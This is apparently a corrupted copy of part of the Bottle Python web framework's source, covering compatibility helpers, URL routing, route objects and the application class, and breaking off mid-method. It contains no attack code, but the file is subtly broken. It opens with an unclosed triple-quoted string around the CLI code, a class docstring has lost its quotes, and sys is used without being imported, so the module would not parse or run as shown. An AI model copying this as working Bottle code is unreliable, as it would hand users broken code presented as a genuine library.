#!/bin/python
 
import os
import time


'''    def _cli_parse(args):  # pragma: no coverage
    #from argparse import ArgumentParser

    #parser = ArgumentParser(prog=args[0], usage="%(prog)s [options] package.module:app")
    opt = parser.add_argument
    opt("--version", action="store_true", help="show version number.")
    opt("-b", "--bind", metavar="ADDRESS", help="bind socket to ADDRESS.")
    opt("-s", "--server", default='wsgiref', help="use SERVER as backend.")
    opt("-p", "--plugin", action="append", help="install additional plugin/s.")
    opt("-c", "--conf", action="append", metavar="FILE",
        help="load config values from FILE.")
    opt("-C", "--param", action="append", metavar="NAME=VALUE",
        help="override config values.")
    opt("--debug", action="store_true", help="start server in debug mode.")
    opt("--reload", action="store_true", help="auto-reload on file changes.")
    opt('app', help='WSGI app entry point.', nargs='?')

    cli_args = parser.parse_args(args[1:])

    return cli_args, parser


def _cli_patch(cli_args):  # pragma: no coverage
    parsed_args, _ = _cli_parse(cli_args)
    opts = parsed_args
    if opts.server:
        if opts.server.startswith('gevent'):
            import gevent.monkey
            gevent.monkey.patch_all()
        elif opts.server.startswith('eventlet'):
            import eventlet
            eventlet.monkey_patch()


if __name__ == '__main__':
    _cli_patch(sys.argv)

###############################################################################
# Imports and Python 2/3 unification ##########################################
###############################################################################

import base64, calendar, cgi, email.utils, functools, hmac, imp, itertools,\
       mimetypes, os, re, tempfile, threading, time, warnings, weakref, hashlib

from types import FunctionType
from datetime import date as datedate, datetime, timedelta
from tempfile import TemporaryFile
from traceback import format_exc, print_exc
from unicodedata import normalize

try:
    from ujson import dumps as json_dumps, loads as json_lds
except ImportError:
    from json import dumps as json_dumps, loads as json_lds

# inspect.getargspec was removed in Python 3.6, use
# Signature-based version where we can (Python 3.3+)
try:
    from inspect import signature
    def getargspec(func):
        params = signature(func).parameters
        args, varargs, keywords, defaults = [], None, None, []
        for name, param in params.items():
            if param.kind == param.VAR_POSITIONAL:
                varargs = name
            elif param.kind == param.VAR_KEYWORD:
                keywords = name
            else:
                args.append(name)
                if param.default is not param.empty:
                    defaults.append(param.default)
        return (args, varargs, keywords, tuple(defaults) or None)
except ImportError:
    try:
        from inspect import getfullargspec
        def getargspec(func):
            spec = getfullargspec(func)
            kwargs = makelist(spec[0]) + makelist(spec.kwonlyargs)
            return kwargs, spec[1], spec[2], spec[3]
    except ImportError:
        from inspect import getargspec


py = sys.version_info
py3k = py.major > 2

# Lots of stdlib and builtin differences.
if py3k:
    import http.client as httplib
    import _thread as thread
    from urllib.parse import urljoin, SplitResult as UrlSplitResult
    from urllib.parse import urlencode, quote as urlquote, unquote as urlunquote
    urlunquote = functools.partial(urlunquote, encoding='latin1')
    from http.cookies import SimpleCookie, Morsel, CookieError
    from collections.abc import MutableMapping as DictMixin
    import pickle
    from io import BytesIO
    import configparser

    basestring = str
    unicode = str
    json_loads = lambda s: json_lds(touni(s))
    callable = lambda x: hasattr(x, '__call__')
    imap = map

    def _raise(*a):
        raise a[0](a[1]).with_traceback(a[2])
else:  # 2.x
    import httplib
    import thread
    from urlparse import urljoin, SplitResult as UrlSplitResult
    from urllib import urlencode, quote as urlquote, unquote as urlunquote
    from Cookie import SimpleCookie, Morsel, CookieError
    from itertools import imap
    import cPickle as pickle
    from StringIO import StringIO as BytesIO
    import ConfigParser as configparser
    from collections import MutableMapping as DictMixin
    unicode = unicode
    json_loads = json_lds
    exec(compile('def _raise(*a): raise a[0], a[1], a[2]', '<py3fix>', 'exec'))

# Some helpers for string/byte handling
def tob(s, enc='utf8'):
    if isinstance(s, unicode):
        return s.encode(enc)
    return b'' if s is None else bytes(s)


def touni(s, enc='utf8', err='strict'):
    if isinstance(s, bytes):
        return s.decode(enc, err)
    return unicode("" if s is None else s)


tonat = touni if py3k else tob


def _stderr(*args):
    try:
        print(*args, file=sys.stderr)
    except (IOError, AttributeError):
        pass # Some environments do not allow printing (mod_wsgi)


# A bug in functools causes it to break if the wrapper is an instance method
def update_wrapper(wrapper, wrapped, *a, **ka):
    try:
        functools.update_wrapper(wrapper, wrapped, *a, **ka)
    except AttributeError:
        pass

# These helpers are used at module level and need to be defined first.
# And yes, I know PEP-8, but sometimes a lower-case classname makes more sense.


def depr(major, minor, cause, fix):
    text = "Warning: Use of deprecated feature or API. (Deprecated in Bottle-%d.%d)\n"\
           "Cause: %s\n"\
           "Fix: %s\n" % (major, minor, cause, fix)
    if DEBUG == 'strict':
        raise DeprecationWarning(text)
    warnings.warn(text, DeprecationWarning, stacklevel=3)
    return DeprecationWarning(text)


def makelist(data):  # This is just too handy
    if isinstance(data, (tuple, list, set, dict)):
        return list(data)
    elif data:
        return [data]
    else:
        return []


class DictProperty(object):
 Property that maps to a key in a local dict-like attribute. 

    def __init__(self, attr, key=None, read_only=False):
        self.attr, self.key, self.read_only = attr, key, read_only

    def __call__(self, func):
        functools.update_wrapper(self, func, updated=[])
        self.getter, self.key = func, self.key or func.__name__
        return self

    def __get__(self, obj, cls):
        if obj is None: return self
        key, storage = self.key, getattr(obj, self.attr)
        if key not in storage: storage[key] = self.getter(obj)
        return storage[key]

    def __set__(self, obj, value):
        if self.read_only: raise AttributeError("Read-Only property.")
        getattr(obj, self.attr)[self.key] = value

    def __delete__(self, obj):
        if self.read_only: raise AttributeError("Read-Only property.")
        del getattr(obj, self.attr)[self.key]


class cached_property(object):
    """ A property that is only computed once per instance and then replaces
        itself with an ordinary attribute. Deleting the attribute resets the
        property. """

    def __init__(self, func):
        update_wrapper(self, func)
        self.func = func

    def __get__(self, obj, cls):
        if obj is None: return self
        value = obj.__dict__[self.func.__name__] = self.func(obj)
        return value


class lazy_attribute(object):
    """ A property that caches itself to the class object. """

    def __init__(self, func):
        functools.update_wrapper(self, func, updated=[])
        self.getter = func

    def __get__(self, obj, cls):
        value = self.getter(cls)
        setattr(cls, self.__name__, value)
        return value

###############################################################################
# Exceptions and Events #######################################################
###############################################################################


class BottleException(Exception):
    """ A base class for exceptions used by bottle. """
    pass

###############################################################################
# Routing ######################################################################
###############################################################################


class RouteError(BottleException):
    """ This is a base class for all routing related exceptions """


class RouteReset(BottleException):
    """ If raised by a plugin or request handler, the route is reset and all
        plugins are re-applied. """


class RouterUnknownModeError(RouteError):

    pass


class RouteSyntaxError(RouteError):
    """ The route parser found something not supported by this router. """


class RouteBuildError(RouteError):
    """ The route could not be built. """


def _re_flatten(p):
    """ Turn all capturing groups in a regular expression pattern into
        non-capturing groups. """
    if '(' not in p:
        return p
    return re.sub(r'(\\*)(\(\?P<[^>]+>|\((?!\?))', lambda m: m.group(0) if
                  len(m.group(1)) % 2 else m.group(1) + '(?:', p)


class Router(object):
    """ A Router is an ordered collection of route->target pairs. It is used to
        efficiently match WSGI requests against a number of routes and return
        the first target that satisfies the request. The target may be anything,
        usually a string, ID or callable object. A route consists of a path-rule
        and a HTTP method.
        The path-rule is either a static path (e.g. `/contact`) or a dynamic
        path that contains wildcards (e.g. `/wiki/<page>`). The wildcard syntax
        and details on the matching order are described in docs:`routing`.
    """

    default_pattern = '[^/]+'
    default_filter = 're'

    #: The current CPython regexp implementation does not allow more
    #: than 99 matching groups per regular expression.
    _MAX_GROUPS_PER_PATTERN = 99

    def __init__(self, strict=False):
        self.rules = []  # All rules in order
        self._groups = {}  # index of regexes to find them in dyna_routes
        self.builder = {}  # Data structure for the url builder
        self.static = {}  # Search structure for static routes
        self.dyna_routes = {}
        self.dyna_regexes = {}  # Search structure for dynamic routes
        #: If true, static routes are no longer checked first.
        self.strict_order = strict
        self.filters = {
            're': lambda conf: (_re_flatten(conf or self.default_pattern),
                                None, None),
            'int': lambda conf: (r'-?\d+', int, lambda x: str(int(x))),
            'float': lambda conf: (r'-?[\d.]+', float, lambda x: str(float(x))),
            'path': lambda conf: (r'.+?', None, None)
        }

    def add_filter(self, name, func):
        """ Add a filter. The provided function is called with the configuration
        string as parameter and must return a (regexp, to_python, to_url) tuple.
        The first element is a string, the last two are callables or None. """
        self.filters[name] = func

    rule_syntax = re.compile('(\\\\*)'
        '(?:(?::([a-zA-Z_][a-zA-Z_0-9]*)?()(?:#(.*?)#)?)'
          '|(?:<([a-zA-Z_][a-zA-Z_0-9]*)?(?::([a-zA-Z_]*)'
            '(?::((?:\\\\.|[^\\\\>])+)?)?)?>))')

    def _itertokens(self, rule):
        offset, prefix = 0, ''
        for match in self.rule_syntax.finditer(rule):
            prefix += rule[offset:match.start()]
            g = match.groups()
            if g[2] is not None:
                depr(0, 13, "Use of old route syntax.",
                            "Use <name> instead of :name in routes.")
            if len(g[0]) % 2:  # Escaped wildcard
                prefix += match.group(0)[len(g[0]):]
                offset = match.end()
                continue
            if prefix:
                yield prefix, None, None
            name, filtr, conf = g[4:7] if g[2] is None else g[1:4]
            yield name, filtr or 'default', conf or None
            offset, prefix = match.end(), ''
        if offset <= len(rule) or prefix:
            yield prefix + rule[offset:], None, None

    def add(self, rule, method, target, name=None):
        """ Add a new rule or replace the target for an existing rule. """
        anons = 0  # Number of anonymous wildcards found
        keys = []  # Names of keys
        pattern = ''  # Regular expression pattern with named groups
        filters = []  # Lists of wildcard input filters
        builder = []  # Data structure for the URL builder
        is_static = True

        for key, mode, conf in self._itertokens(rule):
            if mode:
                is_static = False
                if mode == 'default': mode = self.default_filter
                mask, in_filter, out_filter = self.filters[mode](conf)
                if not key:
                    pattern += '(?:%s)' % mask
                    key = 'anon%d' % anons
                    anons += 1
                else:
                    pattern += '(?P<%s>%s)' % (key, mask)
                    keys.append(key)
                if in_filter: filters.append((key, in_filter))
                builder.append((key, out_filter or str))
            elif key:
                pattern += re.escape(key)
                builder.append((None, key))

        self.builder[rule] = builder
        if name: self.builder[name] = builder

        if is_static and not self.strict_order:
            self.static.setdefault(method, {})
            self.static[method][self.build(rule)] = (target, None)
            return

        try:
            re_pattern = re.compile('^(%s)$' % pattern)
            re_match = re_pattern.match
        except re.error as e:
            raise RouteSyntaxError("Could not add Route: %s (%s)" % (rule, e))

        if filters:

            def getargs(path):
                url_args = re_match(path).groupdict()
                for name, wildcard_filter in filters:
                    try:
                        url_args[name] = wildcard_filter(url_args[name])
                    except ValueError:
                        raise HTTPError(400, 'Path has wrong format.')
                return url_args
        elif re_pattern.groupindex:

            def getargs(path):
                return re_match(path).groupdict()
        else:
            getargs = None

        flatpat = _re_flatten(pattern)
        whole_rule = (rule, flatpat, target, getargs)

        if (flatpat, method) in self._groups:
            if DEBUG:
                msg = 'Route <%s %s> overwrites a previously defined route'
                warnings.warn(msg % (method, rule), RuntimeWarning)
            self.dyna_routes[method][
                self._groups[flatpat, method]] = whole_rule
        else:
            self.dyna_routes.setdefault(method, []).append(whole_rule)
            self._groups[flatpat, method] = len(self.dyna_routes[method]) - 1

        self._compile(method)

    def _compile(self, method):
        all_rules = self.dyna_routes[method]
        comborules = self.dyna_regexes[method] = []
        maxgroups = self._MAX_GROUPS_PER_PATTERN
        for x in range(0, len(all_rules), maxgroups):
            some = all_rules[x:x + maxgroups]
            combined = (flatpat for (_, flatpat, _, _) in some)
            combined = '|'.join('(^%s$)' % flatpat for flatpat in combined)
            combined = re.compile(combined).match
            rules = [(target, getargs) for (_, _, target, getargs) in some]
            comborules.append((combined, rules))

    def build(self, _name, *anons, **query):
        """ Build an URL by filling the wildcards in a rule. """
        builder = self.builder.get(_name)
        if not builder:
            raise RouteBuildError("No route with that name.", _name)
        try:
            for i, value in enumerate(anons):
                query['anon%d' % i] = value
            url = ''.join([f(query.pop(n)) if n else f for (n, f) in builder])
            return url if not query else url + '?' + urlencode(query)
        except KeyError as E:
            raise RouteBuildError('Missing URL argument: %r' % E.args[0])

    def match(self, environ):
        """ Return a (target, url_args) tuple or raise HTTPError(400/404/405). """
        verb = environ['REQUEST_METHOD'].upper()
        path = environ['PATH_INFO'] or '/'

        methods = ('PROXY', 'HEAD', 'GET', 'ANY') if verb == 'HEAD' else ('PROXY', verb, 'ANY')

        for method in methods:
            if method in self.static and path in self.static[method]:
                target, getargs = self.static[method][path]
                return target, getargs(path) if getargs else {}
            elif method in self.dyna_regexes:
                for combined, rules in self.dyna_regexes[method]:
                    match = combined(path)
                    if match:
                        target, getargs = rules[match.lastindex - 1]
                        return target, getargs(path) if getargs else {}

        # No matching route found. Collect alternative methods for 405 response
        allowed = set([])
        nocheck = set(methods)
        for method in set(self.static) - nocheck:
            if path in self.static[method]:
                allowed.add(method)
        for method in set(self.dyna_regexes) - allowed - nocheck:
            for combined, rules in self.dyna_regexes[method]:
                match = combined(path)
                if match:
                    allowed.add(method)
        if allowed:
            allow_header = ",".join(sorted(allowed))
            raise HTTPError(405, "Method not allowed.", Allow=allow_header)

        # No matching route and no alternative method found. We give up
        raise HTTPError(404, "Not found: " + repr(path))


class Route(object):
    """ This class wraps a route callback along with route specific metadata and
        configuration and applies Plugins on demand. It is also responsible for
        turning an URL path rule into a regular expression usable by the Router.
    """

    def __init__(self, app, rule, method, callback,
                 name=None,
                 plugins=None,
                 skiplist=None, **config):
        #: The application this route is installed to.
        self.app = app
        #: The path-rule string (e.g. ``/wiki/<page>``).
        self.rule = rule
        #: The HTTP method as a string (e.g. ``GET``).
        self.method = method
        #: The original callback with no plugins applied. Useful for introspection.
        self.callback = callback
        #: The name of the route (if specified) or ``None``.
        self.name = name or None
        #: A list of route-specific plugins (see :meth:`Bottle.route`).
        self.plugins = plugins or []
        #: A list of plugins to not apply to this route (see :meth:`Bottle.route`).
        self.skiplist = skiplist or []
        #: Additional keyword arguments passed to the :meth:`Bottle.route`
        #: decorator are stored in this dictionary. Used for route-specific
        #: plugin configuration and meta-data.
        self.config = app.config._make_overlay()
        self.config.load_dict(config)

    @cached_property
    def call(self):
        """ The route callback with all plugins applied. This property is
            created on demand and then cached to speed up subsequent requests."""
        return self._make_callback()

    def reset(self):
        """ Forget any cached values. The next time :attr:`call` is accessed,
            all plugins are re-applied. """
        self.__dict__.pop('call', None)

    def prepare(self):
        """ Do all on-demand work immediately (useful for debugging)."""
        self.call

    def all_plugins(self):
        """ Yield all Plugins affecting this route. """
        unique = set()
        for p in reversed(self.app.plugins + self.plugins):
            if True in self.skiplist: break
            name = getattr(p, 'name', False)
            if name and (name in self.skiplist or name in unique): continue
            if p in self.skiplist or type(p) in self.skiplist: continue
            if name: unique.add(name)
            yield p

    def _make_callback(self):
        callback = self.callback
        for plugin in self.all_plugins():
            try:
                if hasattr(plugin, 'apply'):
                    callback = plugin.apply(callback, self)
                else:
                    callback = plugin(callback)
            except RouteReset:  # Try again with changed configuration.
                return self._make_callback()
            if callback is not self.callback:
                update_wrapper(callback, self.callback)
        return callback

    def get_undecorated_callback(self):
        """ Return the callback. If the callback is a decorated function, try to
            recover the original function. """
        func = self.callback
        func = getattr(func, '__func__' if py3k else 'im_func', func)
        closure_attr = '__closure__' if py3k else 'func_closure'
        while hasattr(func, closure_attr) and getattr(func, closure_attr):
            attributes = getattr(func, closure_attr)
            func = attributes[0].cell_contents

            # in case of decorators with multiple arguments
            if not isinstance(func, FunctionType):
                # pick first FunctionType instance from multiple arguments
                func = filter(lambda x: isinstance(x, FunctionType),
                              map(lambda x: x.cell_contents, attributes))
                func = list(func)[0]  # py3 support
        return func

    def get_callback_args(self):
        """ Return a list of argument names the callback (most likely) accepts
            as keyword arguments. If the callback is a decorated function, try
            to recover the original function before inspection. """
        return getargspec(self.get_undecorated_callback())[0]

    def get_config(self, key, default=None):
        """ Lookup a config field and return its value, first checking the
            route.config, then route.app.config."""
        depr(0, 13, "Route.get_config() is deprecated.",
                    "The Route.config property already includes values from the"
                    " application config for missing keys. Access it directly.")
        return self.config.get(key, default)

    def __repr__(self):
        cb = self.get_undecorated_callback()
        return '<%s %s -> %s:%s>' % (self.method, self.rule, cb.__module__, cb.__name__)

###############################################################################
# Application Object ###########################################################
###############################################################################


class Bottle(object):
    """ Each Bottle object represents a single, distinct web application and
        consists of routes, callbacks, plugins, resources and configuration.
        Instances are callable WSGI applications.
        :param catchall: If true (default), handle all exceptions. Turn off to
                         let debugging middleware handle exceptions.
    """

    @lazy_attribute
    def _global_config(cls):
        cfg = ConfigDict()
        cfg.meta_set('catchall', 'validate', bool)
        return cfg

    def __init__(self, **kwargs):
        #: A :class:`ConfigDict` for app specific configuration.
        self.config = self._global_config._make_overlay()
        self.config._add_change_listener(
            functools.partial(self.trigger_hook, 'config'))

        self.config.update({
            "catchall": True
        })

        if kwargs.get('catchall') is False:
            depr(0, 13, "Bottle(catchall) keyword argument.",
                        "The 'catchall' setting is now part of the app "
                        "configuration. Fix: `app.config['catchall'] = False`")
            self.config['catchall'] = False
        if kwargs.get('autojson') is False:
            depr(0, 13, "Bottle(autojson) keyword argument.",
                 "The 'autojson' setting is now part of the app "
                 "configuration. Fix: `app.config['json.enable'] = False`")
            self.config['json.disable'] = True

        self._mounts = []

        #: A :class:`ResourceManager` for application files
        self.resources = ResourceManager()

        self.routes = []  # List of installed :class:`Route` instances.
        self.router = Router()  # Maps requests to :class:`Route` instances.
        self.error_handler = {}

        # Core plugins
        self.plugins = []  # List of installed plugins.
        self.install(JSONPlugin())
        self.install(TemplatePlugin())

    #: If true, most exceptions are caught and returned as :exc:`HTTPError`
    catchall = DictProperty('config', 'catchall')

    __hook_names = 'before_request', 'after_request', 'app_reset', 'config'
    __hook_reversed = {'after_request'}

    @cached_property
    def _hooks(self):
        return dict((name, []) for name in self.__hook_names)

    def add_hook(self, name, func):
        """ Attach a callback to a hook. Three hooks are currently implemented:
            before_request
                Executed once before each request. The request context is
                available, but no routing has happened yet.
            after_request
                Executed once after each request regardless of its outcome.
            app_reset
                Called whenever :meth:`Bottle.reset` is called.
        """
        if name in self.__hook_reversed:
            self._hooks[name].insert(0, func)
        else:
            self._hooks[name].append(func)

    def remove_hook(self, name, func):
        """ Remove a callback from a hook. """
        if name in self._hooks and func in self._hooks[name]:
            self._hooks[name].remove(func)
            return True

    def trigger_hook(self, __name, *args, **kwargs):
        """ Trigger a hook and return a list of results. """
        return [hook(*args, **kwargs) for hook in self._hooks[__name][:]]

    def hook(self, name):
        """ Return a decorator that attaches a callback to a hook. See
            :meth:`add_hook` for details."""

        def decorator(func):
            self.add_hook(name, func)
            return func

        return decorator

    def _mount_wsgi(self, prefix, app, **options):
        segments = [p for p in prefix.split('/') if p]
        if not segments:
            raise ValueError('WSGI applications cannot be mounted to "/".')
        path_depth = len(segments)

        def mountpoint_wrapper():
            try:
                request.path_shift(path_depth)
                rs = HTTPResponse([])

                def start_response(status, headerlist, exc_info=None):
                    if exc_info:
                        _raise(*exc_info)
                    if py3k:
                        # Errors here mean that the mounted WSGI app did not
                        # follow PEP-3333 (which requires latin1) or used a
                        # pre-encoding other than utf8 :/
                        status = status.encode('latin1').decode('utf8')
                        headerlist = [(k, v.encode('latin1').decode('utf8'))
                                      for (k, v) in headerlist]
                    rs.status = status
                    for name, value in headerlist:
                        rs.add_header(name, value)
                    return rs.body.append

                body = app(request.environ, start_response)
                rs.body = itertools.chain(rs.body, body) if rs.body else body
                return rs
            finally:
                request.path_shift(-path_depth)

        options.setdefault('skip', True)
        options.setdefault('method', 'PROXY')
        options.setdefault('mountpoint', {'prefix': prefix, 'target': app})
        options['callback'] = mountpoint_wrapper

        self.route('/%s/<:re:.*>' % '/'.join(segments), **options)
        if not prefix.endswith('/'):
            self.route('/' + '/'.join(segments), **options)

    def _mount_app(self, prefix, app, **options):
        if app in self._mounts or '_mount.app' in app.config:
            depr(0, 13, "Application mounted multiple times. Falling back to WSGI mount.",
                 "Clone application before mounting to a different location.")
            return self._mount_wsgi(prefix, app, **options)

        if options:
            depr(0, 13, "Unsupported mount options. Falling back to WSGI mount.",
                 "Do not specify any route options when mounting bottle application.")
            return self._mount_wsgi(prefix, app, **options)

        if not prefix.endswith("/"):
            depr(0, 13, "Prefix must end in '/'. Falling back to WSGI mount.",
                 "Consider adding an explicit redirect from '/prefix' to '/prefix/' in the parent application.")
            return self._mount_wsgi(prefix, app, **options)

        self._mounts.append(app)
        app.config['_mount.prefix'] = prefix
        app.config['_mount.app'] = self
        for route in app.routes:
            route.rule = prefix + route.rule.lstrip('/')
            self.add_route(route)

    def mount(self, prefix, app, **options):
        """ Mount an application (:class:`Bottle` or plain WSGI) to a specific
            URL prefix. Example::
                parent_app.mount('/prefix/', child_app)
            :param prefix: path prefix or `mount-point`.
            :param app: an instance of :class:`Bottle` or a WSGI application.
            Plugins from the parent application are not applied to the routes
            of the mounted child application. If you need plugins in the child
            application, install them separately.
            While it is possible to use path wildcards within the prefix path
            (:class:`Bottle` childs only), it is highly discouraged.
            The prefix path must end with a slash. If you want to access the
            root of the child application via `/prefix` in addition to
            `/prefix/`, consider adding a route with a 307 redirect to the
            parent application.
        """

        if not prefix.startswith('/'):
            raise ValueError("Prefix must start with '/'")

        if isinstance(app, Bottle):
            return self._mount_app(prefix, app, **options)
        else:
            return self._mount_wsgi(prefix, app, **options)

    def merge(self, routes):
        """ Merge the routes of another :class:`Bottle` application or a list of
            :class:`Route` objects into this application. The routes keep their
            'owner', meaning that the :data:`Route.app` attribute is not
            changed. """
        if isinstance(routes, Bottle):
            routes = routes.routes
        for route in routes:
            self.add_route(route)

    def install(self, plugin):
        """ Add a plugin to the list of plugins and prepare it for being
            applied to all routes of this application. A plugin may be a simple
            decorator or an object that implements the :class:`Plugin` API.
        """
        if hasattr(plugin, 'setup'): plugin.setup(self)
        if not callable(plugin) and not hasattr(plugin, 'apply'):
            raise TypeError("Plugins must be callable or implement .apply()")
        self.plugins.append(plugin)
        self.reset()
        return plugin

    def uninstall(self, plugin):
        """ Uninstall plugins. Pass an instance to remove a specific plugin, a type
            object to remove all plugins that match that type, a string to remove
            all plugins with a matching ``name`` attribute or ``True`` to remove all
            plugins. Return the list of removed plugins. """
        removed, remove = [], plugin
        for i, plugin in list(enumerate(self.plugins))[::-1]:
            if remove is True or remove is plugin or remove is type(plugin) \
            or getattr(plugin, 'name', True) == remove:
                removed.append(plugin)
                del self.plugins[i]
                if hasattr(plugin, 'close'): plugin.close()
        if removed: self.reset()
        return removed

    def reset(self, route=None):
        """ Reset all routes (force plugins to be re-applied) and clear all
            caches. If an ID or route object is given, only that specific route
            is affected. """
        if route is None: routes = self.routes
        elif isinstance(route, Route): routes = [route]
        else: routes = [self.routes[route]]
        for route in routes:
            route.reset()
        if DEBUG:
            for route in routes:
                route.prepare()
        self.trigger_hook('app_reset')

    def close(self):
        """ Close the application and all installed plugins. """
        for plugin in self.plugins:
            if hasattr(plugin, 'close'): plugin.close()

    def run(self, **kwargs):
        """ Calls :func:`run` with the same parameters. """
        run(self, **kwargs)

    def match(self, environ):
        """ Search for a matching route and return a (:class:`Route`, urlargs)
            tuple. The second value is a dictionary with parameters extracted
            from the URL. Raise :exc:`HTTPError` (404/405) on a non-match."""
        return self.router.match(environ)

    def get_url(self, routename, **kargs):
        """ Return a string that matches a named route """
        scriptname = request.environ.get('SCRIPT_NAME', '').strip('/') + '/'
        location = self.router.build(routename, **kargs).lstrip('/')
        return urljoin(urljoin('/', scriptname), location)

    def add_route(self, route):
        """ Add a route object, but do not change the :data:`Route.app`
            attribute."""
        self.routes.append(route)
        self.router.add(route.rule, route.method, route, name=route.name)
        if DEBUG: route.prepare()

    def route(self,
              path=None,
              method='GET',
              callback=None,
              name=None,
              apply=None,
              skip=None, **config):
        """ A decorator to bind a function to a request URL. Example::
                @app.route('/hello/<name>')
                def hello(name):
                    return 'Hello %s' % name
            The ``<name>`` part is a wildcard. See :class:`Router` for syntax
            details.
            :param path: Request path or a list of paths to listen to. If no
              path is specified, it is automatically generated from the
              signature of the function.
            :param method: HTTP method (`GET`, `POST`, `PUT`, ...) or a list of
              methods to listen to. (default: `GET`)
            :param callback: An optional shortcut to avoid the decorator
              syntax. ``route(..., callback=func)`` equals ``route(...)(func)``
            :param name: The name for this route. (default: None)
            :param apply: A decorator or plugin or a list of plugins. These are
              applied to the route callback in addition to installed plugins.
            :param skip: A list of plugins, plugin classes or names. Matching
              plugins are not installed to this route. ``True`` skips all.
            Any additional keyword arguments are stored as route-specific
            configuration and passed to plugins (see :meth:`Plugin.apply`).
        """
        if callable(path): path, callback = None, path
        plugins = makelist(apply)
        skiplist = makelist(skip)

        def decorator(callback):
            if isinstance(callback, basestring): callback = load(callback)
            for rule in makelist(path) or yieldroutes(callback):
                for verb in makelist(method):
                    verb = verb.upper()
                    route = Route(self, rule, verb, callback,
                                  name=name,
                                  plugins=plugins,
                                  skiplist=skiplist, **config)
                    self.add_route(route)
            return callback

        return decorator(callback) if callback else decorator

    def get(self, path=None, method='GET', **options):
        """ Equals :meth:`route`. """
        return self.route(path, method, **options)

    def post(self, path=None, method='POST', **options):
        """ Equals :meth:`route` with a ``POST`` method parameter. """
        return self.route(path, method, **options)

    def put(self, path=None, method='PUT', **options):
        """ Equals :meth:`route` with a ``PUT`` method parameter. """
        return self.route(path, method, **options)

    def delete(self, path=None, method='DELETE', **options):
        """ Equals :meth:`route` with a ``DELETE`` method parameter. """
        return self.route(path, method, **options)

    def patch(self, path=None, method='PATCH', **options):
        """ Equals :meth:`route` with a ``PATCH`` method parameter. """
        return self.route(path, method, **options)

    def error(self, code=500, callback=None):
        """ Register an output handler for a HTTP error code. Can
            be used as a decorator or called directly ::
                def error_handler_500(error):
                    return 'error_handler_500'
                app.error(code=500, callback=error_handler_500)
                @app.error(404)
                def error_handler_404(error):
                    return 'error_handler_404'
        """

        def decorator(callback):
            if isinstance(callback, basestring): callback = load(callback)
            self.error_handler[int(code)] = callback
            return callback

        return decorator(callback) if callback else decorator

    def default_error_handler(self, res):
        return tob(template(ERROR_PAGE_TEMPLATE, e=res, template_settings=dict(name='__ERROR_PAGE_TEMPLATE')))

    def _handle(self, environ):
        path = environ['bottle.raw_path'] = environ['PATH_INFO']
        if py3k:
            environ['PATH_INFO'] = path.encode('latin1').decode('utf8', 'ignore')

        environ['bottle.app'] = self
        request.bind(environ)
        response.bind()

        try:
            while True: # Remove in 0.14 together with RouteReset
                out = None
                try:
                    self.trigger_hook('before_request')
                    route, args = self.router.match(environ)
                    environ['route.handle'] = route
                    environ['bottle.route'] = route
                    environ['route.url_args'] = args
                    out = route.call(**args)
                    break
                except HTTPResponse as E:
                    out = E
                    break
                except RouteReset:
                    depr(0, 13, "RouteReset exception deprecated",
                                "Call route.call() after route.reset() and "
                                "return the result.")
                    route.reset()
                    continue
                finally:
                    if isinstance(out, HTTPResponse):
                        out.apply(response)
                    try:
                        self.trigger_hook('after_request')
                    except HTTPResponse as E:
                        out = E
                        out.apply(response)
        except (KeyboardInterrupt, SystemExit, MemoryError):
            raise
        except Exception as E:
            if not self.catchall: raise
            stacktrace = format_exc()
            environ['wsgi.errors'].write(stacktrace)
            environ['wsgi.errors'].flush()
            environ['bottle.exc_info'] = sys.exc_info()
            out = HTTPError(500, "Internal Server Error", E, stacktrace)
            out.apply(response)

        return out

    def _cast(self, out, peek=None):
        """ Try to convert the parameter into something WSGI compatible and set
        correct HTTP headers when possible.
        Support: False, str, unicode, dict, HTTPResponse, HTTPError, file-like,
        iterable of strings and iterable of unicodes
        """

        # Empty output is done here
        if not out:
            if 'Content-Length' not in response:
                response['Content-Length'] = 0
            return []
        # Join lists of byte or unicode strings. Mixed lists are NOT supported
        if isinstance(out, (tuple, list))\
        and isinstance(out[0], (bytes, unicode)):
            out = out[0][0:0].join(out)  # b'abc'[0:0] -> b''
        # Encode unicode strings
        if isinstance(out, unicode):
            out = out.encode(response.charset)
        # Byte Strings are just returned
        if isinstance(out, bytes):
            if 'Content-Length' not in response:
                response['Content-Length'] = len(out)
            return [out]
        # HTTPError or HTTPException (recursive, because they may wrap anything)
        # TODO: Handle these explicitly in handle() or make them iterable.
        if isinstance(out, HTTPError):
            out.apply(response)
            out = self.error_handler.get(out.status_code,
                                         self.default_error_handler)(out)
            return self._cast(out)
        if isinstance(out, HTTPResponse):
            out.apply(response)
            return self._cast(out.body)

        # File-like objects.
        if hasattr(out, 'read'):
            if 'wsgi.file_wrapper' in request.environ:
                return request.environ['wsgi.file_wrapper'](out)
            elif hasattr(out, 'close') or not hasattr(out, '__iter__'):
                return WSGIFileWrapper(out)

        # Handle Iterables. We peek into them to detect their inner type.
        try:
            iout = iter(out)
            first = next(iout)
            while not first:
                first = next(iout)
        except StopIteration:
            return self._cast('')
        except HTTPResponse as E:
            first = E
        except (KeyboardInterrupt, SystemExit, MemoryError):
            raise
        except Exception as error:
            if not self.catchall: raise
            first = HTTPError(500, 'Unhandled exception', error, format_exc())

        # These are the inner types allowed in iterator or generator objects.
        if isinstance(first, HTTPResponse):
            return self._cast(first)
        elif isinstance(first, bytes):
            new_iter = itertools.chain([first], iout)
        elif isinstance(first, unicode):
            encoder = lambda x: x.encode(response.charset)
            new_iter = imap(encoder, itertools.chain([first], iout))
        else:
            msg = 'Unsupported response type: %s' % type(first)
            return self._cast(HTTPError(500, msg))
        if hasattr(out, 'close'):
            new_iter = _closeiter(new_iter, out.close)
        return new_iter

    def wsgi(self, environ, start_response):
        """ The bottle WSGI-interface. """
        try:
            out = self._cast(self._handle(environ))
            # rfc2616 section 4.3
            if response._status_code in (100, 101, 204, 304)\
            or environ['REQUEST_METHOD'] == 'HEAD':
                if hasattr(out, 'close'): out.close()
                out = []
            exc_info = environ.get('bottle.exc_info')
            if exc_info is not None:
                del environ['bottle.exc_info']
            start_response(response._wsgi_status_line(), response.headerlist, exc_info)
            return out
        except (KeyboardInterrupt, SystemExit, MemoryError):
            raise
        except Exception as E:
            if not self.catchall: raise
            err = '<h1>Critical error while processing request: %s</h1>' \
                  % html_escape(environ.get('PATH_INFO', '/'))
            if DEBUG:
                err += '<h2>Error:</h2>\n<pre>\n%s\n</pre>\n' \
                       '<h2>Traceback:</h2>\n<pre>\n%s\n</pre>\n' \
                       % (html_escape(repr(E)), html_escape(format_exc()))
